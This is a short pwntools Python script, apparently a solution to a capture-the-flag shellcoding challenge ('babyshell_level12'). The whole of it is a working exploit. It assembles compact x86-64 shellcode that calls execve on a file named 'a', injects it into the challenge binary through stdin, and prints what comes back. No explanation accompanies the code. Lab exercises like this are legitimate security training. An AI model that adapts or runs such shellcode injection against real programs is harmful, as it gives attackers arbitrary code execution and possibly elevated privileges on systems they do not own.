from pwn import *

context.update(arch="amd64", encoding="latin")

p = process("/challenge/babyshell_level12")

shellcode = f'''
.intel_syntax noprefix
.global _start

_start:
        push 0x61
        mov rdi, rsp
        xor edx, edx
        mov sil, 0x00
        mov al, 0x3b
        syscall
'''

shellcode = asm(shellcode)

p.readuntil(b"Reading 0x1000 bytes from stdin.")
p.write(shellcode)
print(p.readall().decode('utf-8'))
